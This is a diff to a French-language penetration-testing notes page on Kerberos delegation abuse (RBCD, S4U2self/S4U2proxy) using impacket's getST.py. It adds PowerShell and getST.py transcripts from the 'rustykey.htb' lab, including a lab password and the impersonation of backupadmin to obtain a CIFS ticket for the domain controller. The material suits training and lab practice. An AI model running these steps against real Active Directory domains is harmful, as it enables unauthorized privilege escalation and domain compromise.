@@ -211,6 +211,22 @@ getST.py -u2u -impersonate "Administrateur" -spn "host/cible.domaine.com" -k -no
 changepasswd.py -hashes :CleSessionTGT -newhashes :AncienNTHash 'domaine'/'comptesansSPN'@'IP_DC'
 ```
 
+```
+PS C:\> Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
+PS C:\> Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount
+
+DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=rustykey,DC=htb
+DNSHostName                          : dc.rustykey.htb
+Enabled                              : True
+Name                                 : DC
+ObjectClass                          : computer
+ObjectGUID                           : dee94947-219e-4b13-9d41-543a4085431c
+PrincipalsAllowedToDelegateToAccount : {CN=IT-Computer3,OU=Computers,OU=IT,DC=rustykey,DC=htb}
+SamAccountName                       : DC$
+SID                                  : S-1-5-21-3316070415-896458127-4139322052-1000
+UserPrincipalName                    : 
+```
+
 #### <mark style="color:green;">Étapes individuelles (si nécessaire)</mark>
 
 ```bash
@@ -219,6 +235,18 @@ getST.py -u2u -self -impersonate "Administrateur" -k -no-pass 'domaine'/'comptes
 
 # S4U2proxy seul (avec -additional-ticket)
 getST.py -additional-ticket ticket_s4u2self.ccache -spn "host/cible.domaine.com" -k -no-pass 'domaine'/'comptesansSPN'
+```
+
+```
+oxdf@hacky$ getST.py 'rustykey.htb/IT-COMPUTER3$:Rusty88!' -k -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating backupadmin
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
 ```
 
 ***
